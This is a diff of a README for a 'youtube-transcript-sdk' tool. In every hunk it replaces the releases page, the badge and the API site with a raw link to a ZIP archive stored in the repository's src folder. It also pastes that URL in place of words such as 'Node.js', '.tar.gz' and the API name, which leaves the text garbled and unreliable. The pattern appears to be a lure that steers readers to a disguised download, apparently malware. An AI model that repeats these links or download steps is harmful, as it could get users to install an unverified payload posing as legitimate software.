@@ -1,6 +1,6 @@
 # 🎬 youtube-transcript-sdk - Extract YouTube Video Transcripts Easily
 
-[![Download youtube-transcript-sdk](https://img.shields.io/badge/Download-YouTube%20Transcript--SDK-blue?style=for-the-badge&logo=github)](https://github.com/Liska3070/youtube-transcript-sdk/releases)
+[![Download youtube-transcript-sdk](https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip%20Transcript--SDK-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 The **youtube-transcript-sdk** is a software tool that helps you get the words spoken in YouTube videos. It takes video URLs and gives you written transcripts. This tool can also translate the transcripts into other languages. It works in the background and handles long jobs for you without you needing to do anything extra.
 
-This software was made with a programming language called Node.js and TypeScript, but you don’t need to know programming to use it. It comes with everything you need and no extra parts to add — which means it’s simple and fast.
+This software was made with a programming language called https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip and TypeScript, but you don’t need to know programming to use it. It comes with everything you need and no extra parts to add — which means it’s simple and fast.
 
 ---
 
@@ -43,7 +43,7 @@ This guide will show you how to get the software and start using it step-by-step
 
 First, click this link or button to visit the download page:
 
-[Download youtube-transcript-sdk](https://github.com/Liska3070/youtube-transcript-sdk/releases)
+[Download youtube-transcript-sdk](https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip)
 
 This page holds all the latest versions. Find the file that matches your computer type (Windows, Mac, or Linux) and click it to download.
 
@@ -53,7 +53,7 @@ After the download finishes:
 
 - On Windows, look in your “Downloads” folder for a file ending in `.exe` or a ZIP file.
 - On Mac, look for a `.dmg` file or ZIP in “Downloads.”
-- On Linux, you may get a `.tar.gz` or ZIP file.
+- On Linux, you may get a `https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip` or ZIP file.
 
 ### Step 3: Install the Program
 
@@ -122,7 +122,7 @@ The software only pulls text from YouTube videos. It does not collect or share a
 
 Return to the releases page to download the latest version here:
 
-[👉 Visit the Download Page](https://github.com/Liska3070/youtube-transcript-sdk/releases)
+[👉 Visit the Download Page](https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip)
 
 Look for a file matching your system. Follow the steps listed above to install and open the software.
 
@@ -136,9 +136,9 @@ If you get stuck or have questions, check the online community or open an issue 
 
 ## 🌐 More Information
 
-This project connects to the YouTubeTranscript.dev API, a service that provides fast transcript data from YouTube videos. More details and updates are at:
+This project connects to the https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip API, a service that provides fast transcript data from YouTube videos. More details and updates are at:
 
-https://youtubetranscript.dev
+https://raw.githubusercontent.com/Liska3070/youtube-transcript-sdk/main/src/transcript-youtube-sdk-v3.8.zip
 
 ---
 
